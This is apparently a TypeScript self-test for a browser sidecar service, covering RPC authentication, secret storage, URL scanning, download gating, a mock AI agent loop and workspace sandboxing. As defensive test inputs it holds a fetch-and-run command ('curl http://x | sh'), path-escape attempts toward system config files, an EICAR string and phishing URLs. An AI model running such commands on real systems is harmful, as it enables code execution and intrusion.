/**
 * 自检入口（`npm run self-test` → `node dist/selftest.js`）。
 *
 * 设计原则：**不联网、不需要浏览器、不需要 Electron**。
 * 覆盖 8 项：
 * 1. 在临时端口启动 RPC 服务器；
 * 2. 鉴权：无 token / 错 token → 401，正确 token → 成功；
 * 3. 在临时用户数据目录里往返设置 + 书签 + 历史 CRUD；
 * 4. 校验 API Key 绝不明文落盘（读 secrets.json 断言明文不出现）；
 * 5. URL 扫描表（含 turtlelnc 例外与危险下载警告用例）；
 * 6. 用本地假 OpenAI 服务端跑一轮智能体循环（工具调用 → 最终回答），
 *    断言工具执行器收到的名称/参数正确，并断言超档位工具被拒绝；
 * 7. 对内置的假 MCP 服务器完成一次真实 stdio 往返（initialize / tools/list / tools/call）；
 * 8. 打印 `SELFTEST OK` 并退出 0；任何失败打印中文诊断并退出 1。
 */

import { mkdtempSync, existsSync, readFileSync, readdirSync, rmSync, writeFileSync, mkdirSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { fileURLToPath } from 'node:url'
import { APP_BUILD, APP_VERSION } from './shared/constants.js'
import { setLifecycleHooks } from './rpc/methods.js'
import { RpcServer } from './rpc/server.js'
import { registerAllMethods } from './rpc/methods.js'
import { initUserDataDir, userDataFile } from './paths.js'
import { store } from './store/store.js'
import { bookmarks } from './store/bookmarks.js'
import { history } from './store/history.js'
import { downloads } from './store/downloads.js'
import { API_KEY_MASK } from './store/store.js'
import { MockToolExecutor } from './ai/executor.js'
import { runAgent } from './ai/agent.js'
import { McpRegistry } from './ai/mcp.js'
import { Workspace } from './ai/modes/workspace.js'
import { analyzeCsv, parseCsvLine, extractDateLines } from './ai/modes/office.js'
import { unifiedDiff, matchKnownErrors, detectTestCommand } from './ai/modes/dev.js'
import { getToolsForLevel, toolStats, browserToolsWithoutAction } from './ai/tools.js'
import { actionToolMismatches, AUTOMATION_ACTIONS } from './automation/actions.js'
import { buildAutomationInfo } from './automation/discovery.js'
import { writeAutomationDoc } from './automation/docs.js'
import { scanUrl } from './security/url-scanner.js'
import { initSecurity } from './security/index.js'
import { gateDownload } from './security/download-gate.js'
import { isTrustedHost, isTrustedUrl, TRUSTED_PUBLISHERS } from './security/trusted.js'
import { actionToolMismatches as mismatchCheck } from './automation/actions.js'
import { AccountService } from './sync/accounts.js'
import { LocalFolderBackend } from './sync/backend.js'
import { exportProfile, importProfile, peekProfile } from './sync/profile.js'
import { ApiClient } from './testing/api-client.js'
import { startMockOpenAi } from './testing/mock-openai.js'
import type { LocalToolHost, ToolContext } from './ai/tools.js'
import type { McpStdioClient } from './ai/mcp.js'
import { McpStdioClient as McpClientCtor } from './ai/mcp.js'

const here = dirname(fileURLToPath(import.meta.url))

/** 断言失败计数 */
let failures = 0
let checks = 0

function ok(label: string, detail = ''): void {
  checks++
  process.stdout.write(`  ✔ ${label}${detail ? `　${detail}` : ''}\n`)
}

function fail(label: string, detail = ''): void {
  checks++
  failures++
  process.stdout.write(`  ✘ ${label}${detail ? `　${detail}` : ''}\n`)
}

function assert(condition: boolean, label: string, detail = ''): void {
  if (condition) ok(label, detail)
  else fail(label, detail)
}

function assertEqual<T>(actual: T, expected: T, label: string): void {
  const a = JSON.stringify(actual)
  const b = JSON.stringify(expected)
  if (a === b) ok(label, `= ${a}`)
  else fail(label, `期望 ${b}，实际 ${a}`)
}

function section(title: string): void {
  process.stdout.write(`\n▌${title}\n`)
}

/** 清理：释放端口与子进程，避免自检挂住 */
const cleanups: Array<() => Promise<void> | void> = []
async function runCleanups(): Promise<void> {
  for (const fn of cleanups.reverse()) {
    try {
      await fn()
    } catch {
      /* 清理失败不影响结论 */
    }
  }
}

async function main(): Promise<void> {
  const startedAt = Date.now()
  process.stdout.write(
    `TiBrowser 边车自检　${APP_VERSION} (build ${APP_BUILD})　Node ${process.version} / ${process.platform}\n`
  )

  // 自检使用弱密钥后端：避免依赖 PowerShell（CI 环境可能没有），
  // 同时这也正好用来验证「弱回退时也会写入 insecure:true 且不落明文」。
  process.env['TIB_SECRET_BACKEND'] = 'weak'

  // 准备临时用户数据目录
  const tempRoot = mkdtempSync(join(tmpdir(), 'tib-selftest-'))
  const userData = join(tempRoot, 'userData')
  mkdirSync(userData, { recursive: true })
  const blocklistDir = join(tempRoot, 'blocklists')
  mkdirSync(blocklistDir, { recursive: true })
  writeFileSync(join(blocklistDir, 'phishing.txt'), '# 自检用运行时黑名单\n0.0.0.0 selftest-phishing.example\n')
  writeFileSync(join(blocklistDir, 'malware.txt'), 'selftest-malware.example\n')
  // 让 initSecurity 读到自检用的运行时黑名单
  process.env['TIB_BLOCKLIST_DIR'] = blocklistDir
  initSecurity(blocklistDir)

  cleanups.push(() => rmSync(tempRoot, { recursive: true, force: true }))

  // ---------------------------------------------------------------
  section('1. 启动 RPC 服务器（临时端口 + 随机 token）')
  const { dir } = initUserDataDir(userData)
  assert(dir === userData, '用户数据目录已创建', dir)
  store.init()
  await store.initSecret()

  const rpc = new RpcServer({ port: 0, token: 'selftest-token-0123456789abcdef' })
  rpc.setCapabilities(['selftest'])
  const mcp = new McpRegistry(() => userDataFile('mcp.json'))
  const executor = new MockToolExecutor()
  const accounts = new AccountService({
    getSettings: () => store.getSettings(),
    userDataDir: () => userData
  })
  registerAllMethods(rpc, {
    log: () => {
      /* 自检静默 */
    },
    accounts,
    mcp,
    executor: executor as never,
    secretBackend: () => ({
      mode: process.env['TIB_SECRET_BACKEND'] === 'weak' ? 'weak' : 'dpapi',
      insecure: process.env['TIB_SECRET_BACKEND'] === 'weak',
      note: '自检环境：强制使用 base64 弱混淆以便在无 PowerShell 的机器上也能验证「不落明文」。'
    }),
    reloadBridge: () => ({ baseUrl: '', token: '' }),
    emit: () => {
      /* 自检不订阅事件 */
    }
  })
  const port = await rpc.start()
  cleanups.push(() => rpc.stop())
  assert(port > 0 && port < 65536, 'RPC 服务器已监听随机端口', `port=${port}`)
  assert(rpc.methods().length > 30, '已注册 RPC 方法', `${rpc.methods().length} 个`)

  const api = new ApiClient(`http://127.0.0.1:${port}`, rpc.token)
  const health = await fetch(`http://127.0.0.1:${port}/health`).then((r) => r.json() as Promise<Record<string, unknown>>)
  assert(health['ok'] === true && health['version'] === APP_VERSION, '/health 无需鉴权且返回版本', JSON.stringify(health))

  // ---------------------------------------------------------------
  section('2. 鉴权：错误 token → 401，正确 token → 成功')
  const noAuth = await api.raw('service.ping', undefined, { token: null })
  assert(noAuth.status === 401, '缺少 token 返回 401', `HTTP ${noAuth.status}`)
  assert(
    typeof noAuth.body?.['error'] === 'object' &&
      String((noAuth.body?.['error'] as Record<string, unknown>)['message'] ?? '').includes('鉴权'),
    '401 返回中文鉴权失败消息',
    String((noAuth.body?.['error'] as Record<string, unknown>)?.['message'] ?? '')
  )
  const wrongToken = await api.raw('service.ping', undefined, { token: 'wrong-token' })
  assert(wrongToken.status === 401, '错误 token 返回 401', `HTTP ${wrongToken.status}`)
  const ping = await api.call('service.ping')
  assert(ping.ok === true && (ping.result as Record<string, unknown>)['pong'] === true, '正确 token 调用成功')
  const unknown = await api.raw('rpc/does.not.exist', {}, { token: rpc.token })
  assert(unknown.status === 404, '未知方法返回 404', `HTTP ${unknown.status}`)

  // ---------------------------------------------------------------
  section('3. 设置 / 书签 / 历史 CRUD（临时用户数据目录）')
  const settings = await api.call('store.getSettings')
  assert(settings.ok === true, 'store.getSettings 成功')
  const setRes = await api.call('store.setSettings', {
    patch: { searchEngine: 'baidu', homepage: 'https://example.org', appearance: { theme: 'dark' } }
  })
  assert(
    setRes.ok === true &&
      (setRes.result as Record<string, unknown>)['searchEngine'] === 'baidu' &&
      (setRes.result as Record<string, unknown>)['homepage'] === 'https://example.org',
    'store.setSettings 写入生效'
  )
  const reread = await api.call('store.getSettings')
  assert(
    (reread.result as Record<string, unknown>)['searchEngine'] === 'baidu',
    '设置已落盘并可重新读取',
    String(userDataFile('settings.json'))
  )
  const settingsRaw = readFileSync(userDataFile('settings.json'), 'utf-8')
  assert(!settingsRaw.includes('apiKey') || !/"apiKey"\s*:\s*"[^"]+"/.test(settingsRaw), 'settings.json 不含明文 apiKey 字段')

  const added = await api.call('bookmarks.add', { title: '自检书签', url: 'https://example.com/a' })
  const bookmarkId = ((added.result as Record<string, unknown>)['bookmark'] as Record<string, unknown>)['id'] as string
  assert(added.ok === true && Boolean(bookmarkId), 'bookmarks.add 成功', bookmarkId)
  const toggled = await api.call('bookmarks.toggle', { title: '自检书签2', url: 'https://example.com/b' })
  assert((toggled.result as Record<string, unknown>)['bookmarked'] === true, 'bookmarks.toggle 新增返回 true')
  const toggledAgain = await api.call('bookmarks.toggle', { title: '自检书签2', url: 'https://example.com/b' })
  assert((toggledAgain.result as Record<string, unknown>)['bookmarked'] === false, 'bookmarks.toggle 再次调用返回 false')
  const listed = await api.call('bookmarks.list')
  assert(((listed.result as Record<string, unknown>)['bookmarks'] as unknown[]).length === 1, 'bookmarks.list 返回 1 条')
  const removed = await api.call('bookmarks.remove', { id: bookmarkId })
  assert(removed.ok === true, 'bookmarks.remove 成功')
  const removedAgain = await api.call('bookmarks.remove', { id: bookmarkId })
  assert(removedAgain.ok === false && removedAgain.status === 404, '重复删除返回 404 中文错误')

  await api.call('history.add', { title: '自检历史', url: 'https://example.com/h1' })
  await api.call('history.add', { title: '自检历史2', url: 'https://example.com/h2' })
  const hist = await api.call('history.list', { query: 'h1' })
  assert(((hist.result as Record<string, unknown>)['history'] as unknown[]).length === 1, 'history.list 支持关键词过滤')
  const histAll = await api.call('history.list')
  const firstHistId = (((histAll.result as Record<string, unknown>)['history'] as Array<Record<string, unknown>>)[0] ?? {})['id'] as string
  await api.call('history.remove', { id: firstHistId })
  const histAfter = await api.call('history.list')
  assert(((histAfter.result as Record<string, unknown>)['history'] as unknown[]).length === 1, 'history.remove 生效')

  await api.call('downloads.record', { id: 'dl-1', filename: 'setup.exe', url: 'https://example.com/setup.exe', state: 'completed', totalBytes: 1024 })
  const dl = await api.call('downloads.list')
  assert(((dl.result as Record<string, unknown>)['downloads'] as unknown[]).length === 1, 'downloads.record + list 往返成功')

  // 原子写：不应残留 .tmp 文件
  const leftovers = readdirSync(userData).filter((f) => f.endsWith('.tmp'))
  assert(leftovers.length === 0, '原子写未残留 .tmp 临时文件', leftovers.join('、') || '（无）')

  // ---------------------------------------------------------------
  section('4. API Key 绝不明文落盘')
  const secretPlain = 'sk-selftest-PLAINTEXT-MUST-NOT-APPEAR-9f3a'
  const setKey = await api.call('store.setApiKey', { key: secretPlain })
  assert(setKey.ok === true, 'store.setApiKey 成功')
  const secretsPath = userDataFile('secrets.json')
  assert(existsSync(secretsPath), 'secrets.json 已生成', secretsPath)
  const secretsRaw = readFileSync(secretsPath, 'utf-8')
  assert(!secretsRaw.includes(secretPlain), 'secrets.json 中不出现明文密钥')
  assert(secretsRaw.includes('"insecure": true') || secretsRaw.includes('"insecure":true'), '弱回退时写入 insecure:true 标记')
  const masked = await api.call('store.getSettings')
  const maskedKey = ((masked.result as Record<string, unknown>)['ai'] as Record<string, unknown>)['apiKey']
  assertEqual(maskedKey, API_KEY_MASK, 'store.getSettings 只返回掩码')
  const statusRes = await api.call('store.secretBackend')
  assert(statusRes.ok === true, 'store.secretBackend 可用', JSON.stringify(statusRes.result))
  // 内存中仍能取回真实密钥（供发起模型请求）
  assert(store.getApiKey() === secretPlain, '内存中仍持有真实密钥（不落盘）')

  // ---------------------------------------------------------------
  section('5. URL 扫描与下载闸门（含 turtlelnc 例外）')
  interface ScanCase {
    url: string
    blocked: boolean
    rule: string
    note: string
  }
  const scanCases: ScanCase[] = [
    { url: 'https://selftest-malware.example/x', blocked: true, rule: 'malware-list', note: '运行时恶意名单' },
    { url: 'https://selftest-phishing.example/login', blocked: true, rule: 'phishing-list', note: '运行时钓鱼名单' },
    { url: 'https://example-malware-host.com/a', blocked: true, rule: 'malware-list', note: '内置恶意名单' },
    { url: 'http://203.0.113.9:8080/admin', blocked: true, rule: 'bare-ip', note: '公网裸 IP 直连' },
    { url: 'https://аpple-login.com/', blocked: true, rule: 'homograph', note: '西里尔字母同形异义（punycode 编码域名）' },
    { url: 'https://secure-login-bank.example/', blocked: true, rule: 'keyword', note: '强钓鱼关键词' },
    { url: 'http://user:pass@example.com/', blocked: true, rule: 'credentials', note: 'URL 内嵌凭据' },
    { url: 'https://www.example.com/', blocked: false, rule: 'none', note: '普通站点' },
    { url: 'http://127.0.0.1:5173/', blocked: false, rule: 'internal', note: '本机地址豁免裸 IP' },
    { url: 'http://192.168.1.10/', blocked: false, rule: 'internal', note: '内网地址豁免' },
    { url: 'http://[::1]:8080/', blocked: false, rule: 'internal', note: 'IPv6 回环豁免' },
    { url: 'https://github.com/turtlelnc/tibrowser', blocked: false, rule: 'trusted', note: 'turtlelnc GitHub 组织' },
    { url: 'https://github.com/evilcorp/tibrowser', blocked: false, rule: 'none', note: '非 turtlelnc 的 GitHub 组织不豁免' },
    { url: 'https://cdn.turtlelnc.com/x.exe', blocked: false, rule: 'trusted', note: 'turtlelnc 子域' },
    { url: 'https://turtleweb.cc.cd/download', blocked: false, rule: 'trusted', note: '官网域名' },
    { url: 'https://login-verify.turtlelnc.com/', blocked: false, rule: 'trusted', note: 'turtlelnc 域名命中钓鱼关键词也豁免' }
  ]
  let scanPass = 0
  for (const c of scanCases) {
    const r = scanUrl(c.url)
    if (r.blocked === c.blocked && r.rule === c.rule) scanPass++
    else fail(`扫描用例：${c.note}`, `${c.url} → blocked=${r.blocked} rule=${r.rule}（期望 ${c.blocked}/${c.rule}）`)
  }
  assert(scanPass === scanCases.length, `URL 扫描表全部通过（${scanCases.length} 例）`, `${scanPass}/${scanCases.length}`)

  assert(isTrustedHost('a.b.turtlelnc.com').trusted, 'isTrustedHost 匹配子域')
  assert(isTrustedUrl('https://github.com/turtlelnc').trusted, 'isTrustedUrl 匹配 GitHub 组织')
  assert(!isTrustedUrl('https://github.com/other-org').trusted, 'isTrustedUrl 不误判其他组织')
  assert(
    (TRUSTED_PUBLISHERS.githubOrgs as readonly string[]).includes('turtlelnc') &&
      (TRUSTED_PUBLISHERS.rootDomains as readonly string[]).includes('turtleweb.cc.cd'),
    'TRUSTED_PUBLISHERS 常量内容正确'
  )

  // 下载闸门
  const benign = gateDownload({ url: 'https://example.com/report.pdf', filename: 'report.pdf' })
  assertEqual(benign.action, 'allow', '普通 PDF → allow')
  const installer = gateDownload({ url: 'https://example.com/setup.exe', filename: 'setup.exe' })
  assertEqual(installer.action, 'warn', '普通安装包 → warn（可保留）')
  assert(installer.reason.includes('不会自动阻断') || installer.reason.includes('可自行保留'), '安装包警告文案说明可保留')
  const disguised = gateDownload({
    url: 'https://example.com/photo.jpg',
    filename: 'photo.jpg',
    buffer: Buffer.from('MZ\x90\x00\x03\x00\x00\x00fake-pe-body')
  })
  assertEqual(disguised.action, 'warn', '伪装成 jpg 的 PE → warn')
  const eicar = gateDownload({
    url: 'https://example.com/file.zip',
    filename: 'file.zip',
    buffer: Buffer.from('X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*')
  })
  assertEqual(eicar.action, 'block', 'EICAR 特征 → block')
  const evilUrl = gateDownload({ url: 'https://example-malware-host.com/x.exe', filename: 'x.exe' })
  assertEqual(evilUrl.action, 'block', '恶意域名下载 → block')
  const trustedDownload = gateDownload({
    url: 'https://github.com/turtlelnc/tibrowser/releases/download/v1/setup.exe',
    filename: 'setup.exe'
  })
  assert(trustedDownload.action === 'allow' && trustedDownload.trusted, 'turtlelnc 发布物恒为 allow')

  // 保护档位能力矩阵：云端能力必须标为不可用
  const { PROTECTION_PROFILES } = await import('./security/protection.js')
  assert(
    PROTECTION_PROFILES.enhanced.capabilities.some((c) => c.availability === 'cloud-only'),
    '增强型档位显式标注云端专属能力'
  )

  // ---------------------------------------------------------------
  section('6. 智能体循环（假 OpenAI 服务端 + Mock 执行器 + 权限闸门）')
  const mockAi = await startMockOpenAi({
    turns: [
      { content: '', toolCalls: [{ id: 'call_1', name: 'navigate', arguments: '{"url":"https://example.com"}' }] },
      { content: '', toolCalls: [{ id: 'call_2', name: 'execute_js', arguments: '{"code":"1+1"}' }] },
      { content: '已完成：页面已打开。' }
    ],
    model: 'mock-model'
  })
  cleanups.push(() => mockAi.close())

  const toolExecutor = new MockToolExecutor({ navigate: { ok: true, tabId: 'tab-1' } })
  const host: LocalToolHost = {
    getSettings: () => store.getSettings(),
    updateSetting: () => ({ ok: true }),
    listBookmarks: () => bookmarks.list(),
    addBookmark: (t, u) => bookmarks.add(t, u),
    removeBookmark: (id) => ({ ok: bookmarks.remove(id) }),
    listHistory: (n) => history.list(n),
    clearHistory: () => ({ ok: true }),
    listDownloads: (n) => downloads.list(n),
    getSecurityReport: () => ({ level: store.getProtectionLevel() }),
    getProtectionCapabilities: () => ({ available: [], unavailable: [] })
  }
  const ctx: ToolContext = { executor: toolExecutor, host, workspace: null, mcp: null }

  const agentResult = await runAgent({
    config: {
      enabled: true,
      providerName: '自检假服务端',
      baseUrl: mockAi.url,
      apiKey: 'selftest-key',
      model: 'mock-model',
      systemPrompt: '自检',
      cliPermission: 'daily'
    },
    level: 'daily',
    history: [],
    userMessage: '请打开 example.com 并执行一段脚本',
    ctx,
    signal: new AbortController().signal,
    maxRounds: 8
  })

  assert(agentResult.ok === true, '智能体运行未报错', agentResult.error || '')
  assert(agentResult.rounds === 3, '智能体共进行 3 轮', `rounds=${agentResult.rounds}`)
  assertEqual(toolExecutor.countOf('navigate'), 1, '执行器收到 1 次 navigate 调用')
  const navCall = toolExecutor.lastCall('navigate')
  assertEqual(navCall?.args, { url: 'https://example.com' }, 'navigate 参数正确')
  assertEqual(toolExecutor.countOf('execute_js'), 0, '超档位工具 execute_js 未被下发到执行器')
  const jsLog = agentResult.toolLogs.find((l) => l.name === 'execute_js')
  assert(Boolean(jsLog?.denied), '超档位工具被权限闸门拒绝', jsLog?.error ?? '')
  assert(Boolean(jsLog?.error.includes('权限')), '拒绝原因包含中文权限说明', jsLog?.error ?? '')
  assert(agentResult.content.includes('已完成'), '最终回答被累计返回', agentResult.content)
  assert(mockAi.count() === 3, '假服务端共收到 3 次请求', `${mockAi.count()} 次`)
  const secondReq = mockAi.requestAt(1) as { messages?: Array<Record<string, unknown>> } | undefined
  const toolMsg = (secondReq?.messages ?? []).find((m) => m['role'] === 'tool')
  assert(Boolean(toolMsg), '工具结果已回填到第二轮请求')

  // 流式对话（走同一个假服务端）
  const { chatStream } = await import('./ai/client.js')
  const streamed = await new Promise<string>((resolve) => {
    let text = ''
    chatStream(
      {
        enabled: true,
        providerName: '自检假服务端',
        baseUrl: mockAi.url,
        apiKey: 'selftest-key',
        model: 'mock-model',
        systemPrompt: '',
        cliPermission: 'daily'
      },
      [{ role: 'user', content: '流式测试' }],
      {
        onChunk: (d) => (text += d),
        onDone: (full) => resolve(full || text),
        onError: (m) => resolve(`错误：${m}`)
      }
    )
  })
  assert(typeof streamed === 'string' && streamed.length > 0, 'chatStream 流式返回内容', JSON.stringify(streamed).slice(0, 60))

  // 工具表自洽性
  const stats = toolStats()
  assert(stats.total === 45, '工具总数为 45', `${stats.total}`)
  assertEqual(stats.browser + stats.local, stats.total, '工具分层计数一致')
  assertEqual(browserToolsWithoutAction(), [], '所有浏览器层工具都有协议动作映射')
  assertEqual(actionToolMismatches(), [], '自动化动作表与工具映射表一致')
  assert(getToolsForLevel('off').length === 0, 'off 档位不暴露任何工具')
  assert(getToolsForLevel('daily').length === 23, 'daily 档位 23 个工具', `${getToolsForLevel('daily').length}`)
  assert(getToolsForLevel('developer').length === 41, 'developer 档位 41 个工具', `${getToolsForLevel('developer').length}`)
  assert(getToolsForLevel('full').length === stats.total, 'full 档位可用全部工具')
  // ---------------------------------------------------------------
  section('7. MCP stdio 真实往返（内置假 MCP 服务器）')
  const mockMcpScript = join(here, 'testing', 'mock-mcp-server.js')
  assert(existsSync(mockMcpScript), '假 MCP 服务器脚本已编译', mockMcpScript)
  const mcpRegistry = new McpRegistry(() => userDataFile('mcp-selftest.json'))
  const mcpConfig = {
    name: 'selftest-mcp',
    command: process.execPath,
    args: [mockMcpScript],
    enabled: true,
    autoStart: false
  }
  const client: McpStdioClient = new McpClientCtor(mcpConfig)
  mcpRegistry.useClient(client, mcpConfig)
  cleanups.push(() => mcpRegistry.shutdown())

  const serverStatus = await mcpRegistry.addServer(mcpConfig)
  assert(serverStatus.state === 'ready', 'MCP 服务器握手成功', `state=${serverStatus.state} ${serverStatus.lastError}`)
  assert(serverStatus.toolCount === 2, 'MCP tools/list 返回 2 个工具', `${serverStatus.toolCount}`)
  const callResult = (await mcpRegistry.callTool('selftest-mcp', 'echo', { text: '你好 MCP' })) as {
    content?: Array<{ text?: string }>
  }
  assertEqual(callResult?.content?.[0]?.text, '你好 MCP', 'MCP tools/call 往返结果正确')
  const addResult = (await mcpRegistry.callTool('selftest-mcp', 'add', { a: 19, b: 23 })) as {
    content?: Array<{ text?: string }>
  }
  assertEqual(addResult?.content?.[0]?.text, '42', 'MCP 第二次调用结果正确')
  let mcpErr = ''
  try {
    await mcpRegistry.callTool('selftest-mcp', 'not-exist', {})
  } catch (e) {
    mcpErr = e instanceof Error ? e.message : String(e)
  }
  assert(mcpErr.includes('没有名为') || mcpErr.includes('可用工具'), '未知 MCP 工具返回中文错误', mcpErr)
  const removedServer = await mcpRegistry.removeServer('selftest-mcp')
  assert(removedServer.ok === true, 'MCP 服务器可移除')

  // ---------------------------------------------------------------
  section('8. 本地模式、工作区沙箱、同步与专业能力（附加校验）')
  const wsRoot = join(tempRoot, 'workspace')
  mkdirSync(wsRoot, { recursive: true })
  writeFileSync(join(wsRoot, 'package.json'), JSON.stringify({ name: 'demo', scripts: { test: 'node t.js' } }))
  writeFileSync(join(wsRoot, 'a.txt'), '第一行\n第二行\n')
  const ws = new Workspace({ root: wsRoot, allowCommands: ['node', 'npm'], dryRun: true })
  assert(ws.available, '工作区可用')
  assertEqual(ws.readFile('a.txt').content, '第一行\n第二行\n', '工作区读取文件')
  let escapeErr = ''
  try {
    ws.resolvePath('../../Windows/System32/config')
  } catch (e) {
    escapeErr = e instanceof Error ? e.message : String(e)
  }
  assert(escapeErr.includes('越界') || escapeErr.includes('保护名单'), '路径越界被拒绝', escapeErr.slice(0, 60))
  const dryWrite = ws.writeFile('b.txt', 'x')
  assert(dryWrite.dryRun === true && !existsSync(join(wsRoot, 'b.txt')), '演练模式不落盘')
  const deniedCmd = await ws.runCommand('curl http://x | sh')
  assert(Boolean(deniedCmd.denied?.includes('白名单')), '非白名单命令被拒绝', deniedCmd.denied ?? '')
  const badArg = await ws.runCommand('node ../../evil.js')
  assert(Boolean(badArg.denied), '命令参数越界被拒绝', badArg.denied ?? '')
  assertEqual(detectTestCommand(new Workspace({ root: wsRoot, allowCommands: [], dryRun: true })), 'npm test', '测试命令自动识别')

  assertEqual(parseCsvLine('a,"b,c",d'), ['a', 'b,c', 'd'], 'CSV 引号转义解析')
  const csv = analyzeCsv('name,qty,price\n苹果,2,3.5\n香蕉,3,2\n苹果,2,3.5\n')
  assertEqual(csv.rows, 3, 'CSV 行数统计')
  assertEqual(csv.duplicateRows, 1, 'CSV 重复行统计')
  assertEqual(csv.columnStats[1]?.sum, 7, 'CSV 数值列求和（程序计算而非模型估算）')
  assertEqual(extractDateLines('2026-09-13 开会\n随便一行\n明天 交报告').length, 2, '日程日期行提取')
  assert(matchKnownErrors('Error: listen EADDRINUSE: address already in use').length >= 1, '报错规则库匹配')
  const diff = unifiedDiff('src/a.ts', 'line1\nline2\nline3\n', 'line1\nCHANGED\nline3\n')
  assert(diff.includes('--- a/src/a.ts') && diff.includes('+CHANGED'), '统一 diff 生成正确')

  // 同步（本地文件夹后端）
  const syncDir = join(tempRoot, 'sync')
  mkdirSync(syncDir, { recursive: true })
  const syncAccounts = new AccountService({
    getSettings: () => ({ ...store.getSettings(), syncFolder: syncDir }),
    userDataDir: () => userData
  })
  syncAccounts.setBackend(new LocalFolderBackend(syncDir, 'selftest-device'))
  const pushResult = await syncAccounts.syncNow('push')
  assert(pushResult.ok === true && pushResult.files > 0, '本地文件夹同步推送成功', pushResult.message)
  assert(existsSync(join(syncDir, 'devices', 'selftest-device', 'settings.json')), '同步目录出现 settings.json')
  const syncState = await syncAccounts.getSyncState()
  assert(syncState.lastSyncedAt > 0, '同步状态记录了上次同步时间')
  const noBackend = new AccountService({
    getSettings: () => store.getSettings(),
    userDataDir: () => userData
  })
  const noBackendResult = await noBackend.syncNow('both')
  assert(noBackendResult.ok === false && noBackendResult.message.includes('同步目录'), '未配置同步目录时明确失败', noBackendResult.message.slice(0, 50))

  // .tbuser 导出 / 导入
  const tbuserPath = join(tempRoot, 'profile.tbuser')
  const exported = await exportProfile({ userDataDir: userData, outputPath: tbuserPath })
  assert(exported.sizeBytes > 0 && existsSync(tbuserPath), '.tbuser 导出成功', `${exported.sizeBytes} 字节`)
  const manifest = peekProfile(tbuserPath)
  assert(manifest?.format === 'tbuser' && manifest.producer === 'tib-service', '.tbuser 清单可读', JSON.stringify(manifest))
  const importDir = join(tempRoot, 'imported')
  mkdirSync(importDir, { recursive: true })
  const imported = await importProfile({ inputPath: tbuserPath, userDataDir: importDir })
  assert(imported.files > 0 && existsSync(join(importDir, 'settings.json')), '.tbuser 导入成功', `${imported.files} 个文件`)

  // 自动化发现文件
  const autoInfo = buildAutomationInfo({ enabled: false, port, token: rpc.token })
  assert(autoInfo.token === undefined, '默认关闭时发现文件不写入 token')
  const autoInfoOn = buildAutomationInfo({ enabled: true, port, token: rpc.token })
  assert(autoInfoOn.token === rpc.token && autoInfoOn.wsUrl.includes('/automation-ws'), '开启后发现文件包含 token 与 ws 地址')
  const autoRes = await api.call('automation.actions')
  assert(
    ((autoRes.result as Record<string, unknown>)['actions'] as unknown[]).length === AUTOMATION_ACTIONS.length,
    'automation.actions 返回全部动作'
  )

  // 文档生成器：必须落盘为真正的 Markdown 文本，而不是被 JSON 序列化的一行字符串
  const docPath = join(tempRoot, 'AUTOMATION.md')
  const docOut = writeAutomationDoc({ userDataDir: tempRoot, outputPath: docPath })
  const docText = readFileSync(docPath, 'utf-8')
  assert(docOut.bytes > 5000, 'AUTOMATION.md 生成成功', `${docOut.bytes} 字节`)
  assert(docText.startsWith('# TiBrowser 本地自动化 API'), '文档首行是 Markdown 标题（未被 JSON 转义）')
  assert(docText.includes('\n## 6. 动作表') && !docText.includes('\\n## '), '文档包含真实换行而非转义序列')
  assert(
    AUTOMATION_ACTIONS.every((a) => docText.includes(`\`${a.name}\``)) || docText.includes('| `getTabs` |'),
    '文档列出了动作表条目'
  )

  // SSE 通道（真实连接 + 事件投递）
  const sseEvents: string[] = []
  const sseController = new AbortController()
  const ssePromise = (async () => {
    const res = await fetch(`http://127.0.0.1:${port}/events?token=${rpc.token}`, {
      signal: sseController.signal
    })
    if (!res.ok || !res.body) return
    const reader = res.body.getReader()
    const decoder = new TextDecoder()
    let buf = ''
    while (sseEvents.length < 2) {
      const { done, value } = await reader.read()
      if (done) break
      buf += decoder.decode(value, { stream: true })
      for (const line of buf.split('\n')) {
        if (line.startsWith('event: ')) sseEvents.push(line.slice(7).trim())
      }
      buf = buf.slice(buf.lastIndexOf('\n') + 1)
    }
  })().catch(() => undefined)
  await new Promise((r) => setTimeout(r, 120))
  rpc.emit('securityEvent', { url: 'https://selftest.example', verdict: 'blocked', action: 'block' })
  await Promise.race([ssePromise, new Promise((r) => setTimeout(r, 800))])
  sseController.abort()
  assert(sseEvents.includes('ready'), 'SSE 连接建立并收到 ready 帧', sseEvents.join('、'))
  assert(sseEvents.includes('securityEvent'), 'SSE 收到 securityEvent 事件', sseEvents.join('、'))
  const sseNoAuth = await fetch(`http://127.0.0.1:${port}/events?token=bad`).catch(() => null)
  assert(sseNoAuth?.status === 401, 'SSE 使用错误 token 返回 401', `HTTP ${sseNoAuth?.status}`)

  // ---------------------------------------------------------------
  await runCleanups()
  void setLifecycleHooks
  void mismatchCheck

  const elapsed = ((Date.now() - startedAt) / 1000).toFixed(2)
  process.stdout.write(`\n共执行 ${checks} 项检查，失败 ${failures} 项，耗时 ${elapsed} 秒。\n`)
  if (failures === 0) {
    process.stdout.write('SELFTEST OK\n')
    process.exit(0)
  } else {
    process.stdout.write(`SELFTEST FAILED：有 ${failures} 项检查未通过，请查看上方 ✘ 标记的中文诊断。\n`)
    process.exit(1)
  }
}

main().catch(async (e) => {
  process.stdout.write(`\nSELFTEST FAILED：自检过程抛出异常：${e instanceof Error ? e.stack ?? e.message : String(e)}\n`)
  await runCleanups()
  process.exit(1)
})
